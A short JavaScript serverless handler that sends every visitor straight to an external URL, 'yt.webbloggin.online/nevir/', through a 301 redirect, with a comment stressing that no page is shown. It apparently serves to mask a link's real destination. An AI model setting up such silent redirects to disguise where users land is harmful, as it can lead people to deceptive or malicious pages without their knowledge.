export default function handler(req, res) {
  // Direct redirect - no page visible
  res.setHeader('Location', 'https://yt.webbloggin.online/nevir/');
  res.statusCode = 301;
  res.end();
}
